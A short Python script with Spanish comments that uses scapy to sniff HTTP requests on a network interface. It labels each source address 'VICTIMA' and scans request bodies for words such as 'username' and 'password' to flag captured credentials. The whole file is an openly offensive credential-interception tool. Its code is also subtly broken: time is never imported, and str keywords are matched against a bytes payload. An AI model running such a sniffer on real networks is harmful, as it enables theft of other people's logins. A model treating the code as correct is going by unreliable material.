#! /usr/bin/env python3
#_*_ coding: utf8_*_

from scapy.all import*
import sys
import argparse
from scapy.layers import http

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interfaz", help="Selecciona la interfaz a sniffear")
parser = parser.parse_args()

wordlist = ["username", "user", "usuario", "password"]

def capture_http(pkt):
    if pkt.haslayer(http.HTTPRequest): # NOTE: Con esto le decimos a la herramienta que si el paquete contiene una capa que sea una petición http
        print("[+] VICTIMA --> " + pkt[IP].src + "[+] DESTINO --> " + pkt[IP].dst + "[+] DOMINIO --> " + str(pkt[http.HTTPRequest.Host])) # NOTE: En el protocolo HTTP siempre hay direccion IP
        if pkt.haslayer(Raw): # NOTE: Si contiene una capa RAW significa que hay datos que se estan enviando
            load = pkt[Raw].load
            load = load.lower()
            for e in wordlist:
                if e in load:
                    print("[+] Posible usuario o password [+]")
def main():
    if parser.interfaz:
        for x in "[+] Capturando paquetes [+]\n":
            print(x,end="")
            sys.stdout.flush()
            time.sleep(0.05)

        sniff(iface=parser.interfaz, store = False, prn=capture_http)

    else:
        print("No has introducido ninguna interfaz para sniffear")
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n')
        exit()
